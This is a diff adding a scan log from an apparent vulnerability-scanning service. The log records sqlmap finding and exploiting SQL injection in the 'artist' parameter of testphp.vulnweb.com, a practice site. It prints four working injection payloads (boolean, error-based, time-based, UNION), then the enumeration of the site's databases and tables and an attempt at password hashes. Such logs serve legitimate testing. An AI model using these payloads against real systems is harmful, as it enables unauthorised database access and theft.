@@ -1,0 +1,217 @@
+[2026-02-18 10:06:56] [*] Starting FULL SQL scan for http://testphp.vulnweb.com/artists.php?artist=1 (User: DivyaViradiya_1)...
+[2026-02-18 10:06:56] [*] Starting FULL scan (Detection + Enumeration) on http://testphp.vulnweb.com/artists.php?artist=1
+[2026-02-18 10:06:56] [*] Executing SQLMap...
+[2026-02-18 10:07:03] ___
+[2026-02-18 10:07:03] __H__
+[2026-02-18 10:07:03] ___ ___["]_____ ___ ___  {1.10.1.12#dev}
+[2026-02-18 10:07:03] |_ -| . [)]     | .'| . |
+[2026-02-18 10:07:03] |___|_  ["]_|_|_|__,|  _|
+[2026-02-18 10:07:03] |_|V...       |_|   https://sqlmap.org
+[2026-02-18 10:07:03] [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[2026-02-18 10:07:03] [*] starting @ 10:07:03 /2026-02-18/
+[2026-02-18 10:07:03] [10:07:03] [WARNING] using 'D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1' as the output directory
+[2026-02-18 10:07:03] [10:07:03] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15 Ddg/18.6' from file 'D:\SQLmap_setup\data\txt\user-agents.txt'
+[2026-02-18 10:07:03] do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[2026-02-18 10:07:03] [10:07:03] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-02-18 10:07:03] [10:07:03] [INFO] searching for links with depth 1
+[2026-02-18 10:07:03] [10:07:03] [INFO] starting 2 threads
+[2026-02-18 10:07:04] do you want to normalize crawling results [Y/n] Y
+[2026-02-18 10:07:04] do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[2026-02-18 10:07:12] [1/1] URL:
+[2026-02-18 10:07:12] GET http://testphp.vulnweb.com/artists.php?artist=1
+[2026-02-18 10:07:12] do you want to test this URL? [Y/n/q]
+[2026-02-18 10:07:12] > Y
+[2026-02-18 10:07:12] [STAGE] [10:07:12] [INFO] testing URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-02-18 10:07:12] [10:07:12] [INFO] using 'D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1\results-02182026_1007am.csv' as the CSV results file in multiple targets mode
+[2026-02-18 10:07:13] [STAGE] [10:07:13] [INFO] checking if the target is protected by some kind of WAF/IPS
+[2026-02-18 10:07:13] [STAGE] [10:07:13] [INFO] testing if the target URL content is stable
+[2026-02-18 10:07:14] [10:07:14] [INFO] target URL content is stable
+[2026-02-18 10:07:14] [STAGE] [10:07:14] [INFO] testing if GET parameter 'artist' is dynamic
+[2026-02-18 10:07:14] [10:07:14] [INFO] GET parameter 'artist' appears to be dynamic
+[2026-02-18 10:07:14] [10:07:14] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')
+[2026-02-18 10:07:15] [+] [10:07:15] [INFO] heuristic (XSS) test shows that GET parameter 'artist' might be vulnerable to cross-site scripting (XSS) attacks
+[2026-02-18 10:07:15] [STAGE] [10:07:15] [INFO] testing for SQL injection on GET parameter 'artist'
+[2026-02-18 10:07:15] [+] it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[2026-02-18 10:07:15] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (2) values? [Y/n] Y
+[2026-02-18 10:07:15] [STAGE] [10:07:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[2026-02-18 10:07:15] [10:07:15] [WARNING] reflective value(s) found and filtering out
+[2026-02-18 10:07:19] [10:07:19] [INFO] GET parameter 'artist' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="sem")
+[2026-02-18 10:07:19] [STAGE] [10:07:19] [INFO] testing 'Generic inline queries'
+[2026-02-18 10:07:19] [STAGE] [10:07:19] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[2026-02-18 10:07:19] [STAGE] [10:07:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[2026-02-18 10:07:20] [STAGE] [10:07:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[2026-02-18 10:07:20] [STAGE] [10:07:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[2026-02-18 10:07:20] [STAGE] [10:07:20] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[2026-02-18 10:07:21] [10:07:21] [INFO] GET parameter 'artist' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+[2026-02-18 10:07:21] [STAGE] [10:07:21] [INFO] testing 'MySQL inline queries'
+[2026-02-18 10:07:21] [STAGE] [10:07:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[2026-02-18 10:07:25] [10:07:21] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)
+[2026-02-18 10:07:25] [STAGE] [10:07:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[2026-02-18 10:07:26] [STAGE] [10:07:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[2026-02-18 10:07:26] [STAGE] [10:07:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[2026-02-18 10:07:26] [STAGE] [10:07:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[2026-02-18 10:07:27] [STAGE] [10:07:27] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[2026-02-18 10:07:27] [STAGE] [10:07:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[2026-02-18 10:07:38] [10:07:38] [INFO] GET parameter 'artist' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+[2026-02-18 10:07:38] [STAGE] [10:07:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[2026-02-18 10:07:38] [10:07:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[2026-02-18 10:07:39] [10:07:39] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[2026-02-18 10:07:40] [10:07:40] [INFO] target URL appears to have 3 columns in query
+[2026-02-18 10:07:43] [10:07:43] [INFO] GET parameter 'artist' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[2026-02-18 10:07:43] [STAGE] GET parameter 'artist' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+[2026-02-18 10:07:43] sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
+[2026-02-18 10:07:43] ---
+[2026-02-18 10:07:43] Parameter: artist (GET)
+[2026-02-18 10:07:43] Type: boolean-based blind
+[2026-02-18 10:07:43] Title: AND boolean-based blind - WHERE or HAVING clause
+[2026-02-18 10:07:43] Payload: artist=1 AND 7148=7148
+[2026-02-18 10:07:43] Type: error-based
+[2026-02-18 10:07:43] Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+[2026-02-18 10:07:43] Payload: artist=1 AND GTID_SUBSET(CONCAT(0x716a627a71,(SELECT (ELT(2839=2839,1))),0x7176786b71),2839)
+[2026-02-18 10:07:43] Type: time-based blind
+[2026-02-18 10:07:43] Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+[2026-02-18 10:07:43] Payload: artist=1 AND (SELECT 6736 FROM (SELECT(SLEEP(5)))wnwi)
+[2026-02-18 10:07:43] Type: UNION query
+[2026-02-18 10:07:43] Title: Generic UNION query (NULL) - 3 columns
+[2026-02-18 10:07:43] Payload: artist=-1575 UNION ALL SELECT CONCAT(0x716a627a71,0x6e674b757945785677505363635979684a5272685a704976694f69636955707869624e7369556b44,0x7176786b71),NULL,NULL-- -
+[2026-02-18 10:07:43] ---
+[2026-02-18 10:07:43] do you want to exploit this SQL injection? [Y/n] Y
+[2026-02-18 10:07:43] [+] [10:07:43] [INFO] the back-end DBMS is MySQL
+[2026-02-18 10:07:43] [DATA] [10:07:43] [INFO] fetching banner
+[2026-02-18 10:07:47] web server operating system: Linux Ubuntu
+[2026-02-18 10:07:47] web application technology: Nginx 1.19.0, PHP 5.6.40
+[2026-02-18 10:07:47] [+] back-end DBMS operating system: Linux Ubuntu
+[2026-02-18 10:07:47] [+] back-end DBMS: MySQL >= 5.6
+[2026-02-18 10:07:47] banner: '8.0.22-0ubuntu0.20.04.2'
+[2026-02-18 10:07:47] [DATA] [10:07:47] [INFO] fetching current user
+[2026-02-18 10:07:47] current user: 'acuart@localhost'
+[2026-02-18 10:07:47] [DATA] [10:07:47] [INFO] fetching current database
+[2026-02-18 10:07:48] current database: 'acuart'
+[2026-02-18 10:07:48] [STAGE] [10:07:48] [INFO] testing if current user is DBA
+[2026-02-18 10:07:48] [DATA] [10:07:48] [INFO] fetching current user
+[2026-02-18 10:07:48] [10:07:48] [WARNING] potential permission problems detected ('command denied')
+[2026-02-18 10:07:48] [10:07:48] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[2026-02-18 10:07:48] current user is DBA: False
+[2026-02-18 10:07:48] [DATA] [10:07:48] [INFO] fetching database users password hashes
+[2026-02-18 10:07:49] [10:07:49] [WARNING] the SQL query provided does not return any output
+[2026-02-18 10:07:50] [10:07:50] [WARNING] the SQL query provided does not return any output
+[2026-02-18 10:07:51] [10:07:51] [WARNING] the SQL query provided does not return any output
+[2026-02-18 10:07:52] [10:07:52] [WARNING] the SQL query provided does not return any output
+[2026-02-18 10:07:52] [DATA] [10:07:52] [INFO] fetching database users
+[2026-02-18 10:07:52] [DATA] [10:07:52] [INFO] fetching number of password hashes for user 'acuart'
+[2026-02-18 10:07:54] [DATA] [10:07:52] [INFO] retrieved:
+[2026-02-18 10:07:54] multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
+[2026-02-18 10:07:54] [DATA] [10:07:54] [INFO] retrieved: [10:07:54] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+[2026-02-18 10:07:56] [DATA] [10:07:55] [INFO] retrieved:
+[2026-02-18 10:07:57] [DATA] [10:07:56] [INFO] retrieved:
+[2026-02-18 10:07:57] [10:07:57] [WARNING] unable to retrieve the number of password hashes for user 'acuart'
+[2026-02-18 10:07:57] [10:07:57] [ERROR] unable to retrieve the password hashes for the database users
+[2026-02-18 10:07:57] [DATA] [10:07:57] [INFO] fetching database names
+[2026-02-18 10:07:58] available databases [2]:
+[2026-02-18 10:07:58] [*] acuart
+[2026-02-18 10:07:58] [*] information_schema
+[2026-02-18 10:07:58] [DATA] [10:07:58] [INFO] fetching tables for databases: 'acuart, information_schema'
+[2026-02-18 10:07:58] Database: acuart
+[2026-02-18 10:07:58] [8 tables]
+[2026-02-18 10:07:58] +---------------------------------------+
+[2026-02-18 10:07:58] | artists                               |
+[2026-02-18 10:07:58] | carts                                 |
+[2026-02-18 10:07:58] | categ                                 |
+[2026-02-18 10:07:58] | featured                              |
+[2026-02-18 10:07:58] | guestbook                             |
+[2026-02-18 10:07:58] | pictures                              |
+[2026-02-18 10:07:58] | products                              |
+[2026-02-18 10:07:58] | users                                 |
+[2026-02-18 10:07:58] +---------------------------------------+
+[2026-02-18 10:07:58] Database: information_schema
+[2026-02-18 10:07:58] [79 tables]
+[2026-02-18 10:07:58] +---------------------------------------+
+[2026-02-18 10:07:58] | ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
+[2026-02-18 10:07:58] | APPLICABLE_ROLES                      |
+[2026-02-18 10:07:58] | CHARACTER_SETS                        |
+[2026-02-18 10:07:58] | CHECK_CONSTRAINTS                     |
+[2026-02-18 10:07:58] | COLLATIONS                            |
+[2026-02-18 10:07:58] | COLLATION_CHARACTER_SET_APPLICABILITY |
+[2026-02-18 10:07:58] | COLUMNS_EXTENSIONS                    |
+[2026-02-18 10:07:58] | COLUMN_PRIVILEGES                     |
+[2026-02-18 10:07:58] | COLUMN_STATISTICS                     |
+[2026-02-18 10:07:58] | ENABLED_ROLES                         |
+[2026-02-18 10:07:58] | FILES                                 |
+[2026-02-18 10:07:58] | INNODB_BUFFER_PAGE                    |
+[2026-02-18 10:07:58] | INNODB_BUFFER_PAGE_LRU                |
+[2026-02-18 10:07:58] | INNODB_BUFFER_POOL_STATS              |
+[2026-02-18 10:07:58] | INNODB_CACHED_INDEXES                 |
+[2026-02-18 10:07:58] | INNODB_CMP                            |
+[2026-02-18 10:07:58] | INNODB_CMPMEM                         |
+[2026-02-18 10:07:58] | INNODB_CMPMEM_RESET                   |
+[2026-02-18 10:07:58] | INNODB_CMP_PER_INDEX                  |
+[2026-02-18 10:07:58] | INNODB_CMP_PER_INDEX_RESET            |
+[2026-02-18 10:07:58] | INNODB_CMP_RESET                      |
+[2026-02-18 10:07:58] | INNODB_COLUMNS                        |
+[2026-02-18 10:07:58] | INNODB_DATAFILES                      |
+[2026-02-18 10:07:58] | INNODB_FIELDS                         |
+[2026-02-18 10:07:58] | INNODB_FOREIGN                        |
+[2026-02-18 10:07:58] | INNODB_FOREIGN_COLS                   |
+[2026-02-18 10:07:58] | INNODB_FT_BEING_DELETED               |
+[2026-02-18 10:07:58] | INNODB_FT_CONFIG                      |
+[2026-02-18 10:07:58] | INNODB_FT_DEFAULT_STOPWORD            |
+[2026-02-18 10:07:58] | INNODB_FT_DELETED                     |
+[2026-02-18 10:07:58] | INNODB_FT_INDEX_CACHE                 |
+[2026-02-18 10:07:58] | INNODB_FT_INDEX_TABLE                 |
+[2026-02-18 10:07:58] | INNODB_INDEXES                        |
+[2026-02-18 10:07:58] | INNODB_METRICS                        |
+[2026-02-18 10:07:58] | INNODB_SESSION_TEMP_TABLESPACES       |
+[2026-02-18 10:07:58] | INNODB_TABLES                         |
+[2026-02-18 10:07:58] | INNODB_TABLESPACES                    |
+[2026-02-18 10:07:58] | INNODB_TABLESPACES_BRIEF              |
+[2026-02-18 10:07:58] | INNODB_TABLESTATS                     |
+[2026-02-18 10:07:58] | INNODB_TEMP_TABLE_INFO                |
+[2026-02-18 10:07:58] | INNODB_TRX                            |
+[2026-02-18 10:07:58] | INNODB_VIRTUAL                        |
+[2026-02-18 10:07:58] | KEYWORDS                              |
+[2026-02-18 10:07:58] | KEY_COLUMN_USAGE                      |
+[2026-02-18 10:07:58] | OPTIMIZER_TRACE                       |
+[2026-02-18 10:07:58] | PARAMETERS                            |
+[2026-02-18 10:07:58] | PROFILING                             |
+[2026-02-18 10:07:58] | REFERENTIAL_CONSTRAINTS               |
+[2026-02-18 10:07:58] | RESOURCE_GROUPS                       |
+[2026-02-18 10:07:58] | ROLE_COLUMN_GRANTS                    |
+[2026-02-18 10:07:58] | ROLE_ROUTINE_GRANTS                   |
+[2026-02-18 10:07:58] | ROLE_TABLE_GRANTS                     |
+[2026-02-18 10:07:58] | ROUTINES                              |
+[2026-02-18 10:07:58] | SCHEMATA                              |
+[2026-02-18 10:07:58] | SCHEMATA_EXTENSIONS                   |
+[2026-02-18 10:07:58] | SCHEMA_PRIVILEGES                     |
+[2026-02-18 10:07:58] | STATISTICS                            |
+[2026-02-18 10:07:58] | ST_GEOMETRY_COLUMNS                   |
+[2026-02-18 10:07:58] | ST_SPATIAL_REFERENCE_SYSTEMS          |
+[2026-02-18 10:07:58] | ST_UNITS_OF_MEASURE                   |
+[2026-02-18 10:07:58] | TABLESPACES                           |
+[2026-02-18 10:07:58] | TABLESPACES_EXTENSIONS                |
+[2026-02-18 10:07:58] | TABLES_EXTENSIONS                     |
+[2026-02-18 10:07:58] | TABLE_CONSTRAINTS                     |
+[2026-02-18 10:07:58] | TABLE_CONSTRAINTS_EXTENSIONS          |
+[2026-02-18 10:07:58] | TABLE_PRIVILEGES                      |
+[2026-02-18 10:07:58] | USER_ATTRIBUTES                       |
+[2026-02-18 10:07:58] | USER_PRIVILEGES                       |
+[2026-02-18 10:07:58] | VIEWS                                 |
+[2026-02-18 10:07:58] | VIEW_ROUTINE_USAGE                    |
+[2026-02-18 10:07:58] | VIEW_TABLE_USAGE                      |
+[2026-02-18 10:07:58] | COLUMNS                               |
+[2026-02-18 10:07:58] | ENGINES                               |
+[2026-02-18 10:07:58] | EVENTS                                |
+[2026-02-18 10:07:58] | PARTITIONS                            |
+[2026-02-18 10:07:58] | PLUGINS                               |
+[2026-02-18 10:07:58] | PROCESSLIST                           |
+[2026-02-18 10:07:58] | TABLES                                |
+[2026-02-18 10:07:58] | TRIGGERS                              |
+[2026-02-18 10:07:58] +---------------------------------------+
+[2026-02-18 10:07:58] [10:07:58] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1\results-02182026_1007am.csv'
+[2026-02-18 10:07:58] [+] Scan finished. Processing results...
+[2026-02-18 10:07:58] [INFO] Found SQLMap results directory: testphp.vulnweb.com
+[2026-02-18 10:07:58] [INFO] Parsing log file: D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1\testphp.vulnweb.com\log
+[2026-02-18 10:07:58] [+] Successfully parsed 4 vulnerabilities.
+[2026-02-18 10:07:58] [+] SQL JSON report saved to D:\NetShield\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.json
+[2026-02-18 10:07:59] [+] SQL scan complete. Generating PDF report for http://testphp.vulnweb.com/artists.php?artist=1...
+[2026-02-18 10:08:28] [+] PDF report generated and updated in user dashboard: D:\NetShield\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report_testphp_vulnweb_com_artists_php_artist_1.pdf
+[2026-02-18 10:08:28] SYSTEM_EVENT: READY_FOR_ANALYSIS:http://testphp.vulnweb.com/artists.php?artist=1
